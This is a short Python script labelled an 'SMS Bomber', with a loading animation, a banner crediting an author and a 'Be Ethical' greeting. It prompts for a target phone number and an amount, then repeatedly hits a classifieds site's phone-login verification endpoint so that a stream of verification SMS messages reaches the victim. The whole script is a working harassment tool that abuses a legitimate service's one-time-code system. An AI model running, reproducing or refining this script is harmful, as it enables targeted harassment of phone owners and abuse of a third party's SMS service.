import requests
import os
import sys
import time


os.system("clear")

print("\n\n\n")

an = "\t\t\tSystem Loading......"
for ar in an:
    sys.stdout.write(ar)
    sys.stdout.flush()
    time.sleep(0.2)
time.sleep(1)
os.system("clear")
print("\n\n\n")    
ae = "  \t\t\tWelcome to my City\n"
for ar in ae:
    sys.stdout.write(ar)
    sys.stdout.flush()
    time.sleep(0.2)
you = input("\t\tYour Name : ")  
ao = "  \033[1;35mHey "+you+"\033[1;32m Be Ethical" 

for ar in ao:
    sys.stdout.write(ar)
    sys.stdout.flush()
    time.sleep(0.2)
print("\n\n")
time.sleep(1)
os.system("clear")

print("""\n\t\t\t\t\t\t\t\033[1;34m
___  ___      _                               _       _ 
|  \\/  |     | |                             | |     | |
| .  . | __ _| |__   __ _ _ __ ___  _   _  __| |_   _| |
| |\\/| |/ _` | '_ \\ / _` | '_ ` _ \\| | | |/ _` | | | | |
| |  | | (_| | | | | (_| | | | | | | |_| | (_| | |_| | |
\\_|  |_/\\__,_|_| |_|\\__,_|_| |_| |_|\\__,_|\\__,_|\\__,_|_|\n
____________________/               \\_____________________
___________________/                 \\____________________
                                                        
    \033[1;35mTools    : SMS Bomber
    Facebook : Mahamudul Islam
    Linkedin : Mahamudul Islam                                                    
\033[1;34m
    ___/\\__/\\________/\\__/\\___                                                                                                                                                                                                                                                                       
""")
num =input("\033[1;36mTerget Number :")
am =int(input("Amount :"))

sent = 0
while sent<am:
    
    a=requests.get("https://bikroy.com/data/phone_number_login/verifications/phone_login?phone="+num)
    
    sent+=1
    print(f"{sent} sms sent\033[0m")
    


    
